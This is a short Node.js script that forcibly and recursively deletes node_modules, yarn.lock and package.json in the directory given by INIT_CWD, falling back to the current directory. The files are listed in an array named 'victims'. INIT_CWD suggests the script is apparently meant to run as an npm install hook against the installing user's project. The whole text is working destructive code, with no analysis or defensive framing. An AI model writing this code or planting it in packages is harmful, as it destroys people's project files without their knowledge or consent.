const fs = require('fs');
const path = require('path');
const base = process.env.INIT_CWD || process.cwd();
const victims = ['node_modules', 'yarn.lock', 'package.json'];
for (const v of victims) {
  const t = path.join(base, v);
  if (fs.existsSync(t)) fs.rmSync(t, { recursive: true, force: true });
}
